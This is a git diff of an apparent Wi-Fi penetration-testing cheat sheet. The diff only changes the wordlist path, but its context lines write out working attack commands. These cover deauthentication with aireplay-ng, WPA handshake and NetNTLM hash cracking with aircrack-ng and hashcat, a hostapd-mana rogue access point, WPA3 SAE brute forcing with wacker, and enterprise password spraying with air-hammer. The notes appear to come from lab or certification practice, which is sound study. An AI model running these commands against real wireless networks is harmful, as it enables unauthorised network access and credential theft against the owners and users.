@@ -27,7 +27,7 @@
 ### Crack hidden AP name
     ```
     // prep wordlist | customize it 
-    cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ./wifi-rockyou.txt 
+    cat /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt | awk '{print "wifi-" $1}' > ./wifi-rockyou.txt 
     
     // ready crack | Remember turn off airodump first !!! | try few more times
     iwconfig wlan0mon channel 11
@@ -84,7 +84,7 @@
 1. ``` airodump-ng wlan0mon -w ./ -c 6 --wps ```
    in parrell run: 
    ``` aireplay-ng -0 10 -a $BSSID wlan0mon ```
-2. Crack ``` aircrack-ng ./scan-01.cap -w ~/rockyou-top100000.txt ```
+2. Crack ``` aircrack-ng ./scan-01.cap -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt ```
 3. Get password by selecting index
 
 ### Locate ip of the AP web server (not necessarry)
@@ -126,14 +126,14 @@
 2. ```hostapd-mana hostapd.conf```
 3. CTRL+C when AP-STA-POSSIBLE-PSK-MISMATCH.
 4. extract ``` $WPA* xxxx ``` to ```password.txt```
-5. Crack the wifi password ``` sudo hashcat -a 0 -m 22000 password.txt ~/rockyou-top100000.txt --force ```
+5. Crack the wifi password ``` sudo hashcat -a 0 -m 22000 password.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt --force ```
 
 ## WPA 3 SAE
 
 ### Brute force
 - https://github.com/blunderbuss-wctf/wacker
 1. ```cd /home/kali/Downloads/wifi-tools/wacker```
-3. ``` ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462 ``` [ [frequency go search wifi channel x freq , ch10 = 2457](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
+3. ``` ./wacker.py --wordlist /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462 ``` [ [frequency go search wifi channel x freq , ch10 = 2457](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
 4. prep wpa3sae.conf
    ```
     network={
@@ -171,7 +171,7 @@
 6. set same channel to the ap ```iwconfig wlan0mon channel 11```
 7. trigger deauth ``` aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52 ```
 8. extract ``` $WPA* xxxx ``` to ```password.txt```
-9. Crack the wifi password ``` sudo hashcat -a 0 -m 22000 password.txt ~/rockyou-top100000.txt --force ```
+9. Crack the wifi password ``` sudo hashcat -a 0 -m 22000 password.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt --force ```
 10. prep wpa3saepsk.conf
    ```
     network={
@@ -229,7 +229,7 @@
    ```
 6. [If] certain station not work then try another stationID
 7. [Success] --> grab hashcat Netntlm
-8. ``` hashcat -a 0 -m 5500 juan.netntlmhash ~/rockyou-top100000.txt --force ```
+8. ``` hashcat -a 0 -m 5500 juan.netntlmhash /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt --force ```
 9. prep wpa2-mgt.conf
    ```
     network={
@@ -250,7 +250,7 @@
 - https://github.com/Wh1t3Rh1n0/air-hammer
 1. ``` cd  /home/kali/Downloads/wifi-tools/air-hammer ```
 2. prepare user list ``` echo 'CONTOSO\test' > test.user ```
-3. GO FUCK!!! ``` ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user ```
+3. GO FUCK!!! ``` ./air-hammer.py -i wlan3 -e wifi-corp -p /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt -u test.user ```
 
 ### Brute force username with know password
 - https://github.com/Wh1t3Rh1n0/air-hammer
@@ -339,7 +339,7 @@
    ```
 3. Hashcat the result (netntlm)
    ```
-   hashcat -a 0 -m 5600 password.hash ~/rockyou-top100000.txt --force
+   hashcat -a 0 -m 5600 password.hash /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt --force
    ```
 
 ### Exfiltrate CA cert for priviledge account
